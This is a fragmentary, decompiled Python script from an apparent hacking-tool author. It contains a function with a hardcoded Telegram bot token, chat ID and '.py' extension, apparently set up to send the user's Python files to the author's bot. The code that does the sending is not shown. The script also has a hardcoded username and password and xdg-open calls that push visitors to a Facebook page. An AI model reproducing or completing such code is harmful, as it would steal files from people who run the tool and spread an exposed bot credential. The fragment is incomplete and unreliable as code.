# Decompile by Mardis (Tools By tr taknolagy 360)
...
\033[1;32m[-] AUTHOR    :\033[1;32m tr taknolagy 360
\033[1;32m[-] GITHUB    :\033[1;32m hacker1414
\033[1;32m[-] FACEBOOK  :\033[1;32m tr taknolagy 360
...
def akin():
	bot_token = ('7213493704:AAEm-2WCOEs37Ktl7IdsVF_MchbvY4L6I08')
	chat_id = ('6731686007')
	extension = ('.py')
...
rp= 'Rabbi'
x = 'Rabbi'
if 'Rabbi'==user and 'Rabbi'==pas:
	Axak(g+"\n\n\t\t      LOGIN SUCCESSFUL JOIN MY FACEBOOK GROUP ")
	os.system('xdg-open https://www.facebook.com/profile.php?id=61557878762414/?ref=share')
else:
	Axak(y+"\n\n\t\t      Invalid User Or Pass")
	Axak(y+"\n\n\t\tContract Admin For User And Pass")
	os.system("xdg-open https://www.facebook.com/profile.php?id=61557878762414&mibextid=ZbWKwL")
